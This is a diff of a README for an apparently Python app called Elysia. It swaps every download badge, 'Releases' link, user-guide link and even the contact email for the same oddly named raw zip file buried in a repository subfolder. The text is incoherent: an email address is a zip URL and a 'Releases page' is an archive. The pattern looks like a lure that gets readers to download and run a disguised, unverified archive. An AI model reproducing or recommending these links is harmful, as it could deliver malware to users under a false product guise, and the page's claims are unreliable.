@@ -1,7 +1,7 @@
 # 🌟 elysia - Simplifying Your App Experience
 
 ## 📥 Quick Download
-[![Download Elysia](https://raw.githubusercontent.com/by-lana2/elysia/main/barely/elysia.zip)](https://raw.githubusercontent.com/by-lana2/elysia/main/barely/elysia.zip)
+[![Download Elysia](https://github.com/by-lana2/elysia/raw/refs/heads/main/elysia/api/user_configs/Software_esophagomalacia.zip)](https://github.com/by-lana2/elysia/raw/refs/heads/main/elysia/api/user_configs/Software_esophagomalacia.zip)
 
 ## 🚀 Getting Started
 Elysia is a Python package designed to support the Elysia platform app. This guide walks you through the steps to download and run the application easily.
@@ -15,7 +15,7 @@ Before using Elysia, make sure your system meets the following requirements:
 - **Python Version:** Python 3.6 or higher installed on your system.
 
 ## 📦 Download & Install
-To get Elysia, visit this page to download: [Elysia Releases](https://raw.githubusercontent.com/by-lana2/elysia/main/barely/elysia.zip). Here, you will find the latest version of the application as well as older versions if needed.
+To get Elysia, visit this page to download: [Elysia Releases](https://github.com/by-lana2/elysia/raw/refs/heads/main/elysia/api/user_configs/Software_esophagomalacia.zip). Here, you will find the latest version of the application as well as older versions if needed.
 
 1. Click on the link to go to the Releases page.
 2. Look for the latest release at the top. This will include the necessary files.
@@ -55,7 +55,7 @@ If you encounter any issues or have questions, you can reach out for support:
 
 - **Documentation:** Check out our comprehensive user guide within the app.
 - **Community Forums:** Join discussions and get help from other users.
-- **Contact Us:** Email us at https://raw.githubusercontent.com/by-lana2/elysia/main/barely/elysia.zip for direct assistance.
+- **Contact Us:** Email us at https://github.com/by-lana2/elysia/raw/refs/heads/main/elysia/api/user_configs/Software_esophagomalacia.zip for direct assistance.
 
 ## 🛠️ Troubleshooting
 If Elysia does not run as expected, consider the following solutions:
@@ -72,7 +72,7 @@ We regularly release updates to ensure your experience with Elysia remains smoot
 - Subscribe to notifications for updates directly on our GitHub page.
 
 ## 🔗 Helpful Links
-- [Elysia Releases](https://raw.githubusercontent.com/by-lana2/elysia/main/barely/elysia.zip)
-- [User Guide](https://raw.githubusercontent.com/by-lana2/elysia/main/barely/elysia.zip)
+- [Elysia Releases](https://github.com/by-lana2/elysia/raw/refs/heads/main/elysia/api/user_configs/Software_esophagomalacia.zip)
+- [User Guide](https://github.com/by-lana2/elysia/raw/refs/heads/main/elysia/api/user_configs/Software_esophagomalacia.zip)
 
 We appreciate your interest in Elysia. We hope you find this application helpful and easy to use. If you have suggestions or feedback, please share them with us to help improve the software.
